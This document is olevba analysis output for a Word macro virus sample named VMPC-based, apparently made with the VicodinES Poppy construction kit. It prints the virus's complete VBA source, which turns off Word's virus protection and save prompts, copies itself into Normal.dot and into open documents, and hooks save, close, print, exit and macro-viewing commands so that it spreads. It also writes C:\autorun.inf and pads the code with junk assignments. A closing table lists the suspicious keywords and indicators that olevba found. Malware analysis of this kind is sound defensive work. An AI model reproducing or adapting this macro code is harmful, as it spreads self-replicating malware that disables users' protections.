olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.VMPC-based-dd71f804c06c880622fe9a2bc8ebf6f6c34b1102
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.VMPC-based-dd71f804c06c880622fe9a2bc8ebf6f6c34b1102 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Bungle.bas 
in file: Virus.MSWord.VMPC-based-dd71f804c06c880622fe9a2bc8ebf6f6c34b1102 - OLE stream: 'Macros/VBA/Bungle'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
Sub Bungle()
    
    'Produced by,
    'The VicodinES Macro.Poppy Construction Kit v1.0b
    '================================================
    'Code Written by VicodinES "Bad Ideas for Bad People"
    'Poppy ID : 870312907413
    
    
On Error Resume Next
f12728 = u14266 & c15546 & k12965 & m14266
k8562 = m18763 & e7216
With Options
    .ConfirmConversions = False
    .VirusProtection = False
    .SaveNormalPrompt = False
End With
k11618 = m4030 & e6537
k10091 = m6397 & e6877
k13184 = m8279 & e7450
ActiveDocument.ReadOnlyRecommended = False
k15377 = m8870 & e13739
k17936 = m3797 & e6926
f6306 = u8148 & c17549 & Int(Rnd * 5545)
p129087034 = 0
f11841 = u9523 & c10736 & Int(Rnd * 5970)
k6467 = m18474 & e9119
Set er870312903 = MacroContainer
k14623 = m17899 & e4210
If er870312903 = NormalTemplate Then p129087034 = 1
f12722 = u16918 & c10923 & Int(Rnd * 5910)
If p129087034 = 1 Then not12904 = NormalTemplate.FullName Else not12904 = ActiveDocument.FullName
If p129087034 = 1 Then zaq87032 = ActiveDocument.FullName Else zaq87032 = NormalTemplate.FullName
Application.OrganizerCopy Source:=not12904, Destination:=zaq87032, Name:="Bungle", Object:=wdOrganizerObjectProjectItems
f11853 = u4868 & c9807 & Int(Rnd * 8958)
If p129087034 = 1 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
f3068 = u6671 & c15554 & Int(Rnd * 1854)
If p129087034 = 0 Then
     If NormalTemplate.Saved = False Then NormalTemplate.Save
     End If
k6094 = m3222 & e12017
            Call dhIconDisco("C:\autorun.inf")
f6472 = u5352 & c10331 & k13219 & m5352
'VMPCK v1.0b
fuckoff:
End Sub
Sub HelpAbout()
    On Error Resume Next
    MsgBox "BOO ", vbInformation
f9829 = u15194 & c13560 & Int(Rnd * 8162)
End Sub
Sub FileSave()
    On Error Resume Next
    Call Bungle
    ActiveDocument.Save
k19628 = m13130 & e6874
End Sub
Sub FileClose()
    On Error Resume Next
    Call Bungle
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    ActiveDocument.Close
k8874 = m12162 & e17342
End Sub
Sub FileSaveAs()
    On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
    Call Bungle
k12064 = m12973 & e11025
f9306 = u12894 & c7076 & Int(Rnd * 142)
End Sub
Sub FilePrint()
    On Error Resume Next
k3096 = m10267 & e14549
Dialogs(wdDialogFilePrint).Show
f9067 = u6164 & c4608 & k6410 & m6164
    Call Bungle
f5842 = u10031 & c1684 & k1749 & m10031
End Sub
Sub FileExit()
    On Error Resume Next
f17686 = u7157 & c6079 & Int(Rnd * 4165)
    Call Bungle
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Application.Quit
f10699 = u7246 & c14676 & k18997 & m7246
End Sub
Sub ToolsMacro()
    On Error Resume Next
f16067 = u11417 & c15080 & Int(Rnd * 8188)
    Call Bungle
f13699 = u11992 & c4203 & Int(Rnd * 6724)
f13473 = u10606 & c10805 & Int(Rnd * 4935)
k10717 = m2737 & e12251
End Sub
Sub FileTemplates()
    On Error Resume Next
f14448 = u15678 & c4084 & Int(Rnd * 2213)
    Call Bungle
k13878 = m7393 & e10006
k7812 = m13482 & e7840
End Sub
Sub ViewVBCode()
    On Error Resume Next
f4299 = u6358 & c5114 & Int(Rnd * 698)
f73 = u14463 & c10768 & Int(Rnd * 31)
    Call Bungle
f10703 = u9784 & c9414 & Int(Rnd * 4900)
End Sub
Sub dhIconDisco(strFile As String)
Dim hFile As Long
On Error Resume Next
Randomize
Choice = Int(Rnd * 2)
rnn$ = Int(Rnd * 66) + 2
rn$ = Int(Rnd * 27) + 1
Part1$ = "[autorun]"
k13437 = m4137 & e5673
k9531 = m8973 & e3715
Part2$ = "icon = c:\windows\system\pifmgr.dll,"
k13590 = m5377 & e10634
Part22$ = "icon = c:\windows\SYSTEM\shell32.dll,"
Part3$ = Part2$ + rn$
Part33$ = Part22$ + rnn$
    hFile = FreeFile
    Open strFile For Output Access Write As hFile
    Print #hFile, Part1$
    If Choice = 0 Then
        Print #hFile, Part3$
    Else
        Print #hFile, Part33$
    End If
    Close hFile
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|shell32             |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autorun.inf         |Executable file name                         |
|IOC       |pifmgr.dll          |Executable file name                         |
|IOC       |shell32.dll         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

